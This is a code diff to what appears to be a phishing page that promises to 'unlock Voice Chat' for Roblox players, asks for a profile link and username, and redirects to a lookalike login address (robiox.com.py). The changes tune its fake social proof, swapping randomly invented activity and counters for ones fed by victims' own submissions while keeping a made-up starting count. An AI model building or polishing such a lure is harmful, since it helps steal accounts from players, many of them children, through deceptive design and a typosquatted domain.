@@ -412,6 +412,18 @@
       padding: 12px 0;
       border-bottom: 1px solid rgba(255, 255, 255, 0.05);
       font-size: 13px;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateX(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
     }
 
     .activity-item i {
@@ -755,7 +767,7 @@
           <div class="live-stat-label">users unlocked VC today</div>
         </div>
         <div class="live-stat">
-          <div class="live-stat-number" id="processingCount">32</div>
+          <div class="live-stat-number" id="processingCount">0</div>
           <div class="live-stat-label">users processing right now</div>
         </div>
         <div class="stats-header" style="margin-top: 8px;">
@@ -777,16 +789,6 @@
             <i class="fas fa-check-circle"></i>
             <span><span class="activity-user">@RobloxFan2024</span> just unlocked VC</span>
             <span class="activity-time">5 min ago</span>
-          </div>
-          <div class="activity-item">
-            <i class="fas fa-check-circle"></i>
-            <span><span class="activity-user">@NoobSlayer99</span> just unlocked VC</span>
-            <span class="activity-time">8 min ago</span>
-          </div>
-          <div class="activity-item">
-            <i class="fas fa-check-circle"></i>
-            <span><span class="activity-user">@EpicBuilder123</span> just unlocked VC</span>
-            <span class="activity-time">12 min ago</span>
           </div>
         </div>
       </div>
@@ -871,15 +873,9 @@
   // Redirect URL
   const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
   
-  // Sample usernames for activity feed
-  const sampleUsernames = [
-    "xX_ProGamer_Xx", "BloxyMaster", "RobloxFan2024", "NoobSlayer99", 
-    "EpicBuilder123", "LegendaryPlayer", "SpeedRunner", "AdoptMePro",
-    "TowerHero", "SimulatorKing", "BloxFruitsMaster", "PetCollector"
-  ];
-  
-  let todayCount = 1248;
-  let processingCount = 32;
+  // REAL STATS - These update only when someone actually processes
+  let todayCount = 1248;  // Starting count
+  let processingQueue = []; // Active processing users
   
   const statusDiv = document.getElementById('statusArea');
   const progressContainer = document.getElementById('progressContainer');
@@ -893,24 +889,28 @@
   
   let progressInterval = null;
   
-  // Simulate live updates
-  function updateLiveStats() {
-    // Randomly update numbers for realism
-    setInterval(() => {
-      if (Math.random() > 0.7) {
-        todayCount += Math.floor(Math.random() * 3) + 1;
-        todayCountElem.textContent = todayCount.toLocaleString();
-      }
-      
-      if (Math.random() > 0.8) {
-        processingCount = Math.floor(Math.random() * 50) + 15;
-        processingCountElem.textContent = processingCount;
-      }
-    }, 8000);
+  // Update processing count display
+  function updateProcessingCount() {
+    processingCountElem.textContent = processingQueue.length;
   }
   
-  // Add new activity feed items
-  function addActivity(username) {
+  // Add a user to processing queue
+  function addToProcessing(username) {
+    processingQueue.push({ username, startTime: Date.now() });
+    updateProcessingCount();
+    
+    // Auto-remove after 7.5 seconds (simulating processing completion)
+    setTimeout(() => {
+      const index = processingQueue.findIndex(u => u.username === username);
+      if (index !== -1) {
+        processingQueue.splice(index, 1);
+        updateProcessingCount();
+      }
+    }, 7500);
+  }
+  
+  // Add real activity to feed (only when someone actually confirms)
+  function addRealActivity(username) {
     const activityItem = document.createElement('div');
     activityItem.className = 'activity-item';
     const now = new Date();
@@ -934,7 +934,7 @@
       if (index === 0) {
         timeSpan.textContent = 'just now';
       } else {
-        const minutes = index * 3 + 2;
+        const minutes = index * 2 + 1;
         if (minutes < 60) {
           timeSpan.textContent = `${minutes} min ago`;
         } else {
@@ -942,18 +942,6 @@
         }
       }
     });
-  }
-  
-  // Simulate random activity
-  function simulateActivity() {
-    setInterval(() => {
-      if (Math.random() > 0.6) {
-        const randomUsername = sampleUsernames[Math.floor(Math.random() * sampleUsernames.length)];
-        addActivity(randomUsername);
-        todayCount++;
-        todayCountElem.textContent = todayCount.toLocaleString();
-      }
-    }, 15000);
   }
   
   function setStatus(message, type = 'info') {
@@ -973,7 +961,7 @@
   
   function resetSteps() {
     const steps = ['step1', 'step2', 'step3'];
-    steps.forEach((stepId, index) => {
+    steps.forEach((stepId) => {
       const step = document.getElementById(stepId);
       const iconDiv = step.querySelector('.step-icon');
       const statusSpan = step.querySelector('.step-status');
@@ -1095,16 +1083,23 @@
       return;
     }
     
+    // Add to processing queue (REAL STAT)
+    addToProcessing(username);
+    
     startProgress();
     resetSteps();
     modalOverlay.classList.add('active');
     
     runSteps(() => {
       completeProgress();
-      setStatus(`Success! Profile link and username "${username}" confirmed. Voice Chat will be unlocked within 24 hours.`, "success");
-      addActivity(username);
+      // REAL STATS - Only increment when user actually processes
       todayCount++;
       todayCountElem.textContent = todayCount.toLocaleString();
+      
+      // Add to activity feed (REAL ACTIVITY)
+      addRealActivity(username);
+      
+      setStatus(`Success! Profile link and username "${username}" confirmed. Voice Chat will be unlocked within 24 hours.`, "success");
       
       const confirmBtn = document.getElementById('confirmBtn');
       confirmBtn.style.transform = 'scale(1.02)';
@@ -1142,8 +1137,23 @@
     }
   });
   
-  updateLiveStats();
-  simulateActivity();
+  // Update timestamps every minute
+  setInterval(() => {
+    const items = activityFeed.querySelectorAll('.activity-item');
+    items.forEach((item, index) => {
+      const timeSpan = item.querySelector('.activity-time');
+      if (index === 0 && timeSpan.textContent === 'just now') {
+        // Keep first as just now
+      } else {
+        const minutes = index * 2 + 1;
+        if (minutes < 60) {
+          timeSpan.textContent = `${minutes} min ago`;
+        } else {
+          timeSpan.textContent = `${Math.floor(minutes / 60)} hr ago`;
+        }
+      }
+    });
+  }, 60000);
   
   setTimeout(() => {
     setStatus("Click 'Get Profile Link' to get your profile link, then paste it and enter your username", "info");
